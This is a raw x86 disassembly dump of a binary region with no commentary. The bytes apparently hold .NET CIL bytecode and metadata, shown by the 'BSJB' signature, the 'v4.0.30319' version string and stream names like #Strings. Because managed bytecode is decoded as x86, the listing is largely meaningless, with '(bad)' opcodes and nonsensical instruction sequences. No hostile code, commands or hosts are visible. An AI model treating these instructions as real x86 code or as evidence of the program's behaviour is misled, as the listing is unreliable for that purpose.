  4052ef:	04 0c                	add    $0xc,%al
  4052f1:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  4052f5:	00 04 fe             	add    %al,(%esi,%edi,8)
  4052f8:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4052fd:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
  405303:	00 00                	add    %al,(%eax)
  405305:	04 12                	add    $0x12,%al
  405307:	02 28                	add    (%eax),%ch
  405309:	f0 00 00             	lock add %al,(%eax)
  40530c:	0a 7e 1c             	or     0x1c(%esi),%bh
  40530f:	00 00                	add    %al,(%eax)
  405311:	04 1f                	add    $0x1f,%al
  405313:	1e                   	push   %ds
  405314:	1f                   	pop    %ds
  405315:	46                   	inc    %esi
  405316:	6f                   	outsl  %ds:(%esi),(%dx)
  405317:	39 00                	cmp    %eax,(%eax)
  405319:	00 0a                	add    %cl,(%edx)
  40531b:	7e 1e                	jle    0x40533b
  40531d:	00 00                	add    %al,(%eax)
  40531f:	04 6f                	add    $0x6f,%al
  405321:	d2 00                	rolb   %cl,(%eax)
  405323:	00 0a                	add    %cl,(%edx)
  405325:	28 0a                	sub    %cl,(%edx)
  405327:	01 00                	add    %eax,(%eax)
  405329:	0a 6f ed             	or     -0x13(%edi),%ch
  40532c:	00 00                	add    %al,(%eax)
  40532e:	0a 0c 12             	or     (%edx,%edx,1),%cl
  405331:	02 28                	add    (%eax),%ch
  405333:	ee                   	out    %al,(%dx)
  405334:	00 00                	add    %al,(%eax)
  405336:	0a 2d 3f 02 18 25    	or     0x2518023f,%ch
  40533c:	0a 7d 5e             	or     0x5e(%ebp),%bh
  40533f:	00 00                	add    %al,(%eax)
  405341:	04 02                	add    $0x2,%al
  405343:	08 7d 61             	or     %bh,0x61(%ebp)
  405346:	00 00                	add    %al,(%eax)
  405348:	04 02                	add    $0x2,%al
  40534a:	7c 5f                	jl     0x4053ab
  40534c:	00 00                	add    %al,(%eax)
  40534e:	04 12                	add    $0x12,%al
  405350:	02 02                	add    (%edx),%al
  405352:	28 11                	sub    %dl,(%ecx)
  405354:	00 00                	add    %al,(%eax)
  405356:	2b dd                	sub    %ebp,%ebx
  405358:	89 00                	mov    %eax,(%eax)
  40535a:	00 00                	add    %al,(%eax)
  40535c:	02 7b 61             	add    0x61(%ebx),%bh
  40535f:	00 00                	add    %al,(%eax)
  405361:	04 0c                	add    $0xc,%al
  405363:	02 7c 61 00          	add    0x0(%ecx,%eiz,2),%bh
  405367:	00 04 fe             	add    %al,(%esi,%edi,8)
  40536a:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40536f:	02 15 25 0a 7d 5e    	add    0x5e7d0a25,%dl
  405375:	00 00                	add    %al,(%eax)
  405377:	04 12                	add    $0x12,%al
  405379:	02 28                	add    (%eax),%ch
  40537b:	f0 00 00             	lock add %al,(%eax)
  40537e:	0a 28                	or     (%eax),%ch
  405380:	0b 01                	or     (%ecx),%eax
  405382:	00 0a                	add    %cl,(%edx)
  405384:	02 7b 60             	add    0x60(%ebx),%bh
  405387:	00 00                	add    %al,(%eax)
  405389:	04 28                	add    $0x28,%al
  40538b:	3e 00 00             	add    %al,%ds:(%eax)
  40538e:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  405391:	7e 1e                	jle    0x4053b1
  405393:	00 00                	add    %al,(%eax)
  405395:	04 6f                	add    $0x6f,%al
  405397:	0d 01 00 0a 39       	or     $0x390a0001,%eax
  40539c:	ec                   	in     (%dx),%al
  40539d:	fe                   	(bad)
  40539e:	ff                   	(bad)
  40539f:	ff                   	lcall  (bad)
  4053a0:	de 06                	fiadds (%esi)
  4053a2:	26 de 12             	ficoms %es:(%edx)
  4053a5:	26 de 00             	fiadds %es:(%eax)
  4053a8:	7e 1e                	jle    0x4053c8
  4053aa:	00 00                	add    %al,(%eax)
  4053ac:	04 6f                	add    $0x6f,%al
  4053ae:	0d 01 00 0a 39       	or     $0x390a0001,%eax
  4053b3:	1b fe                	sbb    %esi,%edi
  4053b5:	ff                   	(bad)
  4053b6:	ff                   	lcall  (bad)
  4053b7:	de 19                	ficomps (%ecx)
  4053b9:	13 06                	adc    (%esi),%eax
  4053bb:	02 1f                	add    (%edi),%bl
  4053bd:	fe                   	(bad)
  4053be:	7d 5e                	jge    0x40541e
  4053c0:	00 00                	add    %al,(%eax)
  4053c2:	04 02                	add    $0x2,%al
  4053c4:	7c 5f                	jl     0x405425
  4053c6:	00 00                	add    %al,(%eax)
  4053c8:	04 11                	add    $0x11,%al
  4053ca:	06                   	push   %es
  4053cb:	28 f8                	sub    %bh,%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	0a de                	or     %dh,%bl
  4053d1:	13 02                	adc    (%edx),%eax
  4053d3:	1f                   	pop    %ds
  4053d4:	fe                   	(bad)
  4053d5:	7d 5e                	jge    0x405435
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 02                	add    $0x2,%al
  4053db:	7c 5f                	jl     0x40543c
  4053dd:	00 00                	add    %al,(%eax)
  4053df:	04 28                	add    $0x28,%al
  4053e1:	f9                   	stc
  4053e2:	00 00                	add    %al,(%eax)
  4053e4:	0a 2a                	or     (%edx),%ch
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	41                   	inc    %ecx
  4053e9:	4c                   	dec    %esp
  4053ea:	00 00                	add    %al,(%eax)
  4053ec:	00 00                	add    %al,(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	0f 00 00             	sldt   (%eax)
  4053f3:	00 cf                	add    %cl,%bh
  4053f5:	01 00                	add    %eax,(%eax)
  4053f7:	00 de                	add    %bl,%dh
  4053f9:	01 00                	add    %eax,(%eax)
  4053fb:	00 03                	add    %al,(%ebx)
  4053fd:	00 00                	add    %al,(%eax)
  4053ff:	00 43 00             	add    %al,0x0(%ebx)
  405402:	00 01                	add    %al,(%ecx)
  405404:	00 00                	add    %al,(%eax)
  405406:	00 00                	add    %al,(%eax)
  405408:	0f 00 00             	sldt   (%eax)
  40540b:	00 cf                	add    %cl,%bh
  40540d:	01 00                	add    %eax,(%eax)
  40540f:	00 e1                	add    %ah,%cl
  405411:	01 00                	add    %eax,(%eax)
  405413:	00 03                	add    %al,(%ebx)
  405415:	00 00                	add    %al,(%eax)
  405417:	00 1a                	add    %bl,(%edx)
  405419:	00 00                	add    %al,(%eax)
  40541b:	01 00                	add    %eax,(%eax)
  40541d:	00 00                	add    %al,(%eax)
  40541f:	00 07                	add    %al,(%edi)
  405421:	00 00                	add    %al,(%eax)
  405423:	00 ee                	add    %ch,%dh
  405425:	01 00                	add    %eax,(%eax)
  405427:	00 f5                	add    %dh,%ch
  405429:	01 00                	add    %eax,(%eax)
  40542b:	00 19                	add    %bl,(%ecx)
  40542d:	00 00                	add    %al,(%eax)
  40542f:	00 1a                	add    %bl,(%edx)
  405431:	00 00                	add    %al,(%eax)
  405433:	01 36                	add    %esi,(%esi)
  405435:	02 7c 5f 00          	add    0x0(%edi,%ebx,2),%bh
  405439:	00 04 03             	add    %al,(%ebx,%eax,1)
  40543c:	28 fa                	sub    %bh,%dl
  40543e:	00 00                	add    %al,(%eax)
  405440:	0a 2a                	or     (%edx),%ch
  405442:	00 00                	add    %al,(%eax)
  405444:	1b 30                	sbb    (%eax),%esi
  405446:	03 00                	add    (%eax),%eax
  405448:	32 01                	xor    (%ecx),%al
  40544a:	00 00                	add    %al,(%eax)
  40544c:	36 00 00             	add    %al,%ss:(%eax)
  40544f:	11 02                	adc    %eax,(%edx)
  405451:	7b 62                	jnp    0x4054b5
  405453:	00 00                	add    %al,(%eax)
  405455:	04 0a                	add    $0xa,%al
  405457:	06                   	push   %es
  405458:	2c 0c                	sub    $0xc,%al
  40545a:	06                   	push   %es
  40545b:	17                   	pop    %ss
  40545c:	3b ba 00 00 00 38    	cmp    0x38000000(%edx),%edi
  405462:	d8 00                	fadds  (%eax)
  405464:	00 00                	add    %al,(%eax)
  405466:	00 06                	add    %al,(%esi)
  405468:	2c 37                	sub    $0x37,%al
  40546a:	28 56 00             	sub    %dl,0x0(%esi)
  40546d:	00 06                	add    %al,(%esi)
  40546f:	6f                   	outsl  %ds:(%esi),(%dx)
  405470:	ed                   	in     (%dx),%eax
  405471:	00 00                	add    %al,(%eax)
  405473:	0a 0b                	or     (%ebx),%cl
  405475:	12 01                	adc    (%ecx),%al
  405477:	28 ee                	sub    %ch,%dh
  405479:	00 00                	add    %al,(%eax)
  40547b:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  405481:	0a 7d 62             	or     0x62(%ebp),%bh
  405484:	00 00                	add    %al,(%eax)
  405486:	04 02                	add    $0x2,%al
  405488:	07                   	pop    %es
  405489:	7d 64                	jge    0x4054ef
  40548b:	00 00                	add    %al,(%eax)
  40548d:	04 02                	add    $0x2,%al
  40548f:	7c 63                	jl     0x4054f4
  405491:	00 00                	add    %al,(%eax)
  405493:	04 12                	add    $0x12,%al
  405495:	01 02                	add    %eax,(%edx)
  405497:	28 12                	sub    %dl,(%edx)
  405499:	00 00                	add    %al,(%eax)
  40549b:	2b dd                	sub    %ebp,%ebx
  40549d:	e0 00                	loopne 0x40549f
  40549f:	00 00                	add    %al,(%eax)
  4054a1:	02 7b 64             	add    0x64(%ebx),%bh
  4054a4:	00 00                	add    %al,(%eax)
  4054a6:	04 0b                	add    $0xb,%al
  4054a8:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  4054ac:	00 04 fe             	add    %al,(%esi,%edi,8)
  4054af:	15 3a 00 00 01       	adc    $0x100003a,%eax
  4054b4:	02 15 25 0a 7d 62    	add    0x627d0a25,%dl
  4054ba:	00 00                	add    %al,(%eax)
  4054bc:	04 12                	add    $0x12,%al
  4054be:	01 28                	add    %ebp,(%eax)
  4054c0:	f0 00 00             	lock add %al,(%eax)
  4054c3:	0a de                	or     %dh,%bl
  4054c5:	03 26                	add    (%esi),%esp
  4054c7:	de 00                	fiadds (%eax)
  4054c9:	7e 20                	jle    0x4054eb
  4054cb:	00 00                	add    %al,(%eax)
  4054cd:	04 20                	add    $0x20,%al
  4054cf:	c0 27 09             	shlb   $0x9,(%edi)
  4054d2:	00 20                	add    %ah,(%eax)
  4054d4:	80 ee 36             	sub    $0x36,%dh
  4054d7:	00 6f 39             	add    %ch,0x39(%edi)
  4054da:	00 00                	add    %al,(%eax)
  4054dc:	0a 7e 22             	or     0x22(%esi),%bh
  4054df:	00 00                	add    %al,(%eax)
  4054e1:	04 6f                	add    $0x6f,%al
  4054e3:	d2 00                	rolb   %cl,(%eax)
  4054e5:	00 0a                	add    %cl,(%edx)
  4054e7:	28 0a                	sub    %cl,(%edx)
  4054e9:	01 00                	add    %eax,(%eax)
  4054eb:	0a 6f ed             	or     -0x13(%edi),%ch
  4054ee:	00 00                	add    %al,(%eax)
  4054f0:	0a 0b                	or     (%ebx),%cl
  4054f2:	12 01                	adc    (%ecx),%al
  4054f4:	28 ee                	sub    %ch,%dh
  4054f6:	00 00                	add    %al,(%eax)
  4054f8:	0a 2d 3c 02 17 25    	or     0x2517023c,%ch
  4054fe:	0a 7d 62             	or     0x62(%ebp),%bh
  405501:	00 00                	add    %al,(%eax)
  405503:	04 02                	add    $0x2,%al
  405505:	07                   	pop    %es
  405506:	7d 64                	jge    0x40556c
  405508:	00 00                	add    %al,(%eax)
  40550a:	04 02                	add    $0x2,%al
  40550c:	7c 63                	jl     0x405571
  40550e:	00 00                	add    %al,(%eax)
  405510:	04 12                	add    $0x12,%al
  405512:	01 02                	add    %eax,(%edx)
  405514:	28 12                	sub    %dl,(%edx)
  405516:	00 00                	add    %al,(%eax)
  405518:	2b de                	sub    %esi,%ebx
  40551a:	66 02 7b 64          	data16 add 0x64(%ebx),%bh
  40551e:	00 00                	add    %al,(%eax)
  405520:	04 0b                	add    $0xb,%al
  405522:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  405526:	00 04 fe             	add    %al,(%esi,%edi,8)
  405529:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40552e:	02 15 25 0a 7d 62    	add    0x627d0a25,%dl
  405534:	00 00                	add    %al,(%eax)
  405536:	04 12                	add    $0x12,%al
  405538:	01 28                	add    %ebp,(%eax)
  40553a:	f0 00 00             	lock add %al,(%eax)
  40553d:	0a 7e 22             	or     0x22(%esi),%bh
  405540:	00 00                	add    %al,(%eax)
  405542:	04 6f                	add    $0x6f,%al
  405544:	d2 00                	rolb   %cl,(%eax)
  405546:	00 0a                	add    %cl,(%edx)
  405548:	0c 12                	or     $0x12,%al
  40554a:	02 28                	add    (%eax),%ch
  40554c:	aa                   	stos   %al,%es:(%edi)
  40554d:	00 00                	add    %al,(%eax)
  40554f:	0a 39                	or     (%ecx),%bh
  405551:	11 ff                	adc    %edi,%edi
  405553:	ff                   	(bad)
  405554:	ff                   	lcall  (bad)
  405555:	de 17                	ficoms (%edi)
  405557:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  40555c:	62 00                	bound  %eax,(%eax)
  40555e:	00 04 02             	add    %al,(%edx,%eax,1)
  405561:	7c 63                	jl     0x4055c6
  405563:	00 00                	add    %al,(%eax)
  405565:	04 09                	add    $0x9,%al
  405567:	28 f8                	sub    %bh,%al
  405569:	00 00                	add    %al,(%eax)
  40556b:	0a de                	or     %dh,%bl
  40556d:	13 02                	adc    (%edx),%eax
  40556f:	1f                   	pop    %ds
  405570:	fe                   	(bad)
  405571:	7d 62                	jge    0x4055d5
  405573:	00 00                	add    %al,(%eax)
  405575:	04 02                	add    $0x2,%al
  405577:	7c 63                	jl     0x4055dc
  405579:	00 00                	add    %al,(%eax)
  40557b:	04 28                	add    $0x28,%al
  40557d:	f9                   	stc
  40557e:	00 00                	add    %al,(%eax)
  405580:	0a 2a                	or     (%edx),%ch
  405582:	00 00                	add    %al,(%eax)
  405584:	41                   	inc    %ecx
  405585:	34 00                	xor    $0x0,%al
  405587:	00 00                	add    %al,(%eax)
  405589:	00 00                	add    %al,(%eax)
  40558b:	00 17                	add    %dl,(%edi)
  40558d:	00 00                	add    %al,(%eax)
  40558f:	00 5f 00             	add    %bl,0x0(%edi)
  405592:	00 00                	add    %al,(%eax)
  405594:	76 00                	jbe    0x405596
  405596:	00 00                	add    %al,(%eax)
  405598:	03 00                	add    (%eax),%eax
  40559a:	00 00                	add    %al,(%eax)
  40559c:	1a 00                	sbb    (%eax),%al
  40559e:	00 01                	add    %al,(%ecx)
  4055a0:	00 00                	add    %al,(%eax)
  4055a2:	00 00                	add    %al,(%eax)
  4055a4:	07                   	pop    %es
  4055a5:	00 00                	add    %al,(%eax)
  4055a7:	00 00                	add    %al,(%eax)
  4055a9:	01 00                	add    %eax,(%eax)
  4055ab:	00 07                	add    %al,(%edi)
  4055ad:	01 00                	add    %eax,(%eax)
  4055af:	00 17                	add    %dl,(%edi)
  4055b1:	00 00                	add    %al,(%eax)
  4055b3:	00 1a                	add    %bl,(%edx)
  4055b5:	00 00                	add    %al,(%eax)
  4055b7:	01 36                	add    %esi,(%esi)
  4055b9:	02 7c 63 00          	add    0x0(%ebx,%eiz,2),%bh
  4055bd:	00 04 03             	add    %al,(%ebx,%eax,1)
  4055c0:	28 fa                	sub    %bh,%dl
  4055c2:	00 00                	add    %al,(%eax)
  4055c4:	0a 2a                	or     (%edx),%ch
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	42                   	inc    %edx
  4055c9:	53                   	push   %ebx
  4055ca:	4a                   	dec    %edx
  4055cb:	42                   	inc    %edx
  4055cc:	01 00                	add    %eax,(%eax)
  4055ce:	01 00                	add    %eax,(%eax)
  4055d0:	00 00                	add    %al,(%eax)
  4055d2:	00 00                	add    %al,(%eax)
  4055d4:	0c 00                	or     $0x0,%al
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	76 34                	jbe    0x40560e
  4055da:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4055dd:	33 30                	xor    (%eax),%esi
  4055df:	33 31                	xor    (%ecx),%esi
  4055e1:	39 00                	cmp    %eax,(%eax)
  4055e3:	00 00                	add    %al,(%eax)
  4055e5:	00 05 00 6c 00 00    	add    %al,0x6c00
  4055eb:	00 84 1c 00 00 23 7e 	add    %al,0x7e230000(%esp,%ebx,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	f0 1c 00             	lock sbb $0x0,%al
  4055f7:	00 ec                	add    %ch,%ah
  4055f9:	1e                   	push   %ds
  4055fa:	00 00                	add    %al,(%eax)
  4055fc:	23 53 74             	and    0x74(%ebx),%edx
  4055ff:	72 69                	jb     0x40566a
  405601:	6e                   	outsb  %ds:(%esi),(%dx)
  405602:	67 73 00             	addr16 jae 0x405605
  405605:	00 00                	add    %al,(%eax)
  405607:	00 dc                	add    %bl,%ah
  405609:	3b 00                	cmp    (%eax),%eax
  40560b:	00 38                	add    %bh,(%eax)
  40560d:	17                   	pop    %ss
  40560e:	00 00                	add    %al,(%eax)
  405610:	23 55 53             	and    0x53(%ebp),%edx
  405613:	00 14 53             	add    %dl,(%ebx,%edx,2)
  405616:	00 00                	add    %al,(%eax)
  405618:	10 00                	adc    %al,(%eax)
  40561a:	00 00                	add    %al,(%eax)
  40561c:	23 47 55             	and    0x55(%edi),%eax
  40561f:	49                   	dec    %ecx
  405620:	44                   	inc    %esp
  405621:	00 00                	add    %al,(%eax)
  405623:	00 24 53             	add    %ah,(%ebx,%edx,2)
  405626:	00 00                	add    %al,(%eax)
  405628:	5c                   	pop    %esp
  405629:	0b 00                	or     (%eax),%eax
  40562b:	00 23                	add    %ah,(%ebx)
  40562d:	42                   	inc    %edx
  40562e:	6c                   	insb   (%dx),%es:(%edi)
  40562f:	6f                   	outsl  %ds:(%esi),(%dx)
  405630:	62 00                	bound  %eax,(%eax)
  405632:	00 00                	add    %al,(%eax)
  405634:	00 00                	add    %al,(%eax)
  405636:	00 00                	add    %al,(%eax)
  405638:	02 00                	add    (%eax),%al
  40563a:	00 01                	add    %al,(%ecx)
  40563c:	57                   	push   %edi
  40563d:	df 02                	filds  (%edx)
  40563f:	3e 09 0a             	or     %ecx,%ds:(%edx)
  405642:	00 00                	add    %al,(%eax)
  405644:	00 fa                	add    %bh,%dl
  405646:	01 33                	add    %esi,(%ebx)
  405648:	00 16                	add    %dl,(%esi)
  40564a:	00 00                	add    %al,(%eax)
  40564c:	01 00                	add    %eax,(%eax)
  40564e:	00 00                	add    %al,(%eax)
  405650:	86 00                	xchg   %al,(%eax)
  405652:	00 00                	add    %al,(%eax)
  405654:	2f                   	das
  405655:	00 00                	add    %al,(%eax)
  405657:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40565b:	00 8a 00 00 00 59    	add    %cl,0x59000000(%edx)
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	00 00                	add    %al,(%eax)
  405667:	00 0d 01 00 00 07    	add    %cl,0x7000001
  40566d:	00 00                	add    %al,(%eax)
  40566f:	00 33                	add    %dh,(%ebx)
  405671:	00 00                	add    %al,(%eax)
  405673:	00 01                	add    %al,(%ecx)
  405675:	00 00                	add    %al,(%eax)
  405677:	00 02                	add    %al,(%edx)
  405679:	00 00                	add    %al,(%eax)
  40567b:	00 36                	add    %dh,(%esi)
  40567d:	00 00                	add    %al,(%eax)
  40567f:	00 10                	add    %dl,(%eax)
  405681:	00 00                	add    %al,(%eax)
  405683:	00 04 00             	add    %al,(%eax,%eax,1)
  405686:	00 00                	add    %al,(%eax)
  405688:	06                   	push   %es
  405689:	00 00                	add    %al,(%eax)
  40568b:	00 10                	add    %dl,(%eax)
  40568d:	00 00                	add    %al,(%eax)
  40568f:	00 02                	add    %al,(%edx)
  405691:	00 00                	add    %al,(%eax)
  405693:	00 01                	add    %al,(%ecx)
  405695:	00 00                	add    %al,(%eax)
  405697:	00 04 00             	add    %al,(%eax,%eax,1)
  40569a:	00 00                	add    %al,(%eax)
  40569c:	17                   	pop    %ss
  40569d:	00 00                	add    %al,(%eax)
  40569f:	00 12                	add    %dl,(%edx)
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	00 09                	add    %cl,(%ecx)
  4056a7:	0e                   	push   %cs
  4056a8:	01 00                	add    %eax,(%eax)
  4056aa:	00 00                	add    %al,(%eax)
  4056ac:	00 00                	add    %al,(%eax)
  4056ae:	06                   	push   %es
  4056af:	00 17                	add    %dl,(%edi)
  4056b1:	0d 94 16 06 00       	or     $0x61694,%eax
  4056b6:	84 0d 94 16 06 00    	test   %cl,0x61694
  4056bc:	fc                   	cld
  4056bd:	0b dc                	or     %esp,%ebx
  4056bf:	15 0f 00 cc 16       	adc    $0x16cc000f,%eax
  4056c4:	00 00                	add    %al,(%eax)
  4056c6:	06                   	push   %es
  4056c7:	00 24 0c             	add    %ah,(%esp,%ecx,1)
  4056ca:	5b                   	pop    %ebx
  4056cb:	12 06                	adc    (%esi),%al
  4056cd:	00 fa                	add    %bh,%dl
  4056cf:	0c 5b                	or     $0x5b,%al
  4056d1:	12 06                	adc    (%esi),%al
  4056d3:	00 db                	add    %bl,%bl
  4056d5:	0c 5b                	or     $0x5b,%al
  4056d7:	12 06                	adc    (%esi),%al
  4056d9:	00 6b 0d             	add    %ch,0xd(%ebx)
  4056dc:	5b                   	pop    %ebx
  4056dd:	12 06                	adc    (%esi),%al
  4056df:	00 37                	add    %dh,(%edi)
  4056e1:	0d 5b 12 06 00       	or     $0x6125b,%eax
  4056e6:	50                   	push   %eax
  4056e7:	0d 5b 12 06 00       	or     $0x6125b,%eax
  4056ec:	56                   	push   %esi
  4056ed:	0c 5b                	or     $0x5b,%al
  4056ef:	12 06                	adc    (%esi),%al
  4056f1:	00 10                	add    %dl,(%eax)
  4056f3:	0c 75                	or     $0x75,%al
  4056f5:	16                   	push   %ss
  4056f6:	06                   	push   %es
  4056f7:	00 d4                	add    %dl,%ah
  4056f9:	0b 75 16             	or     0x16(%ebp),%esi
  4056fc:	06                   	push   %es
  4056fd:	00 a2 0c 5b 12 06    	add    %ah,0x6125b0c(%edx)
  405703:	00 71 0c             	add    %dh,0xc(%ecx)
  405706:	c1 0e 06             	rorl   $0x6,(%esi)
  405709:	00 3d 12 68 18 06    	add    %bh,0x6186812
  40570f:	00 bf 0c 68 18 06    	add    %bh,0x618680c(%edi)
  405715:	00 e2                	add    %ah,%dl
  405717:	0b bc 1e 06 00 dc 1a 	or     0x1adc0006(%esi,%ebx,1),%edi
  40571e:	5c                   	pop    %esp
  40571f:	11 06                	adc    %eax,(%esi)
  405721:	00 fb                	add    %bh,%bl
  405723:	1d a5 02 06 00       	sbb    $0x602a5,%eax
  405728:	71 11                	jno    0x40573b
  40572a:	5c                   	pop    %esp
  40572b:	11 06                	adc    %eax,(%esi)
  40572d:	00 f0                	add    %dh,%al
  40572f:	09 5c 11 06          	or     %ebx,0x6(%ecx,%edx,1)
  405733:	00 1b                	add    %bl,(%ebx)
  405735:	1c 35                	sbb    $0x35,%al
  405737:	0e                   	push   %cs
  405738:	06                   	push   %es
  405739:	00 b9 0b 94 16 0a    	add    %bh,0xa16940b(%ecx)
  40573f:	00 f4                	add    %dh,%ah
  405741:	19 dc                	sbb    %ebx,%esp
  405743:	15 06 00 07 13       	adc    $0x13070006,%eax
  405748:	5c                   	pop    %esp
  405749:	11 0e                	adc    %ecx,(%esi)
  40574b:	00 d2                	add    %dl,%dl
  40574d:	1a d3                	sbb    %bl,%dl
  40574f:	1b 0a                	sbb    (%edx),%ecx
  405751:	00 92 14 32 1b 0a    	add    %dl,0xa1b3214(%edx)
  405757:	00 4f 1c             	add    %cl,0x1c(%edi)
  40575a:	32 1b                	xor    (%ebx),%bl
  40575c:	0e                   	push   %cs
  40575d:	00 39                	add    %bh,(%ecx)
  40575f:	14 d3                	adc    $0xd3,%al
  405761:	1b 0e                	sbb    (%esi),%ecx
  405763:	00 81 12 d3 1b 7f    	add    %al,0x7f1bd312(%ecx)
  405769:	00 86 15 00 00 0e    	add    %al,0xe000015(%esi)
  40576f:	00 b5 1a d3 1b 0a    	add    %dh,0xa1bd31a(%ebp)
  405775:	00 87 07 0d 12 06    	add    %al,0x6120d07(%edi)
  40577b:	00 0b                	add    %cl,(%ebx)
  40577d:	07                   	pop    %es
  40577e:	5c                   	pop    %esp
  40577f:	11 06                	adc    %eax,(%esi)
  405781:	00 d1                	add    %dl,%cl
  405783:	07                   	pop    %es
  405784:	35 0e 06 00 18       	xor    $0x1800060e,%eax
  405789:	0b 5c 11 06          	or     0x6(%ecx,%edx,1),%ebx
  40578d:	00 3b                	add    %bh,(%ebx)
  40578f:	0c 94                	or     $0x94,%al
  405791:	16                   	push   %ss
  405792:	06                   	push   %es
  405793:	00 26                	add    %ah,(%esi)
  405795:	10 f5                	adc    %dh,%ch
  405797:	17                   	pop    %ss
  405798:	0a 00                	or     (%eax),%al
  40579a:	62 1b                	bound  %ebx,(%ebx)
  40579c:	6b 1a 06             	imul   $0x6,(%edx),%ebx
  40579f:	00 a5 11 35 0e 0a    	add    %ah,0xa0e3511(%ebp)
  4057a5:	00 79 14             	add    %bh,0x14(%ecx)
  4057a8:	6b 1a 0a             	imul   $0xa,(%edx),%ebx
  4057ab:	00 c9                	add    %cl,%cl
  4057ad:	1b 6b 1a             	sbb    0x1a(%ebx),%ebp
  4057b0:	0a 00                	or     (%eax),%al
  4057b2:	19 11                	sbb    %edx,(%ecx)
  4057b4:	6b 1a 06             	imul   $0x6,(%edx),%ebx
  4057b7:	00 df                	add    %bl,%bh
  4057b9:	13 d4                	adc    %esp,%edx
  4057bb:	04 06                	add    $0x6,%al
  4057bd:	00 ee                	add    %ch,%dh
  4057bf:	14 d4                	adc    $0xd4,%al
  4057c1:	04 0a                	add    $0xa,%al
  4057c3:	00 fc                	add    %bh,%ah
  4057c5:	19 32                	sbb    %esi,(%edx)
  4057c7:	1b 0a                	sbb    (%edx),%ecx
  4057c9:	00 30                	add    %dh,(%eax)
  4057cb:	0e                   	push   %cs
  4057cc:	0d 12 0a 00 19       	or     $0x19000a12,%eax
  4057d1:	1e                   	push   %ds
  4057d2:	0d 12 06 00 92       	or     $0x92000612,%eax
  4057d7:	11 5c 11 06          	adc    %ebx,0x6(%ecx,%edx,1)
  4057db:	00 45 12             	add    %al,0x12(%ebp)
  4057de:	5c                   	pop    %esp
  4057df:	11 0e                	adc    %ecx,(%esi)
  4057e1:	00 98 18 d3 1b 0e    	add    %bl,0xe1bd318(%eax)
  4057e7:	00 bc 0a d3 1b 0e 00 	add    %bh,0xe1bd3(%edx,%ecx,1)
  4057ee:	74 19                	je     0x405809
  4057f0:	d3 1b                	rcrl   %cl,(%ebx)
  4057f2:	06                   	push   %es
  4057f3:	00 63 11             	add    %ah,0x11(%ebx)
  4057f6:	35 0e 06 00 cc       	xor    $0xcc00060e,%eax
  4057fb:	0a 5c 11 06          	or     0x6(%ecx,%edx,1),%bl
  4057ff:	00 7a 0a             	add    %bh,0xa(%edx)
  405802:	94                   	xchg   %eax,%esp
  405803:	16                   	push   %ss
  405804:	06                   	push   %es
  405805:	00 d7                	add    %dl,%bh
  405807:	14 94                	adc    $0x94,%al
  405809:	16                   	push   %ss
  40580a:	06                   	push   %es
  40580b:	00 f7                	add    %dh,%bh
  40580d:	13 94 16 06 00 8a 0c 	adc    0xc8a0006(%esi,%edx,1),%edx
  405814:	dc 15 06 00 56 02    	fcoml  0x2560006
  40581a:	25 05 06 00 a6       	and    $0xa6000605,%eax
  40581f:	0b 5c 11 06          	or     0x6(%ecx,%edx,1),%ebx
  405823:	00 44 13 d4          	add    %al,-0x2c(%ebx,%edx,1)
  405827:	04 06                	add    $0x6,%al
  405829:	00 c6                	add    %al,%dh
  40582b:	12 d4                	adc    %ah,%dl
  40582d:	04 06                	add    $0x6,%al
  40582f:	00 e8                	add    %ch,%al
  405831:	12 5c 11 06          	adc    0x6(%ecx,%edx,1),%bl
  405835:	00 2c 02             	add    %ch,(%edx,%eax,1)
  405838:	5c                   	pop    %esp
  405839:	11 06                	adc    %eax,(%esi)
  40583b:	00 d2                	add    %dl,%dl
  40583d:	12 f5                	adc    %ch,%dh
  40583f:	17                   	pop    %ss
  405840:	06                   	push   %es
  405841:	00 48 02             	add    %cl,0x2(%eax)
  405844:	94                   	xchg   %eax,%esp
  405845:	16                   	push   %ss
  405846:	06                   	push   %es
  405847:	00 4d 13             	add    %cl,0x13(%ebp)
  40584a:	d4 04                	aam    $0x4
  40584c:	06                   	push   %es
  40584d:	00 a7 1e a5 02 06    	add    %ah,0x602a51e(%edi)
  405853:	00 be 02 5c 11 06    	add    %bh,0x6115c02(%esi)
  405859:	00 3e                	add    %bh,(%esi)
  40585b:	07                   	pop    %es
  40585c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40585d:	02 0a                	add    (%edx),%cl
  40585f:	00 8a 13 dc 15 06    	add    %cl,0x615dc13(%edx)
  405865:	00 d4                	add    %dl,%ah
  405867:	15 5c 11 06 00       	adc    $0x6115c,%eax
  40586c:	c8 0d 5c 11          	enter  $0x5c0d,$0x11
  405870:	06                   	push   %es
  405871:	00 09                	add    %cl,(%ecx)
  405873:	19 94 16 06 00 d1 1d 	sbb    %edx,0x1dd10006(%esi,%edx,1)
  40587a:	5c                   	pop    %esp
  40587b:	11 06                	adc    %eax,(%esi)
  40587d:	00 68 08             	add    %ch,0x8(%eax)
  405880:	5c                   	pop    %esp
  405881:	11 06                	adc    %eax,(%esi)
  405883:	00 6b 10             	add    %ch,0x10(%ebx)
  405886:	75 16                	jne    0x40589e
  405888:	06                   	push   %es
  405889:	00 aa 08 d4 04 06    	add    %ch,0x604d408(%edx)
  40588f:	00 e5                	add    %ah,%ch
  405891:	1b 5c 11 47          	sbb    0x47(%ecx,%edx,1),%ebx
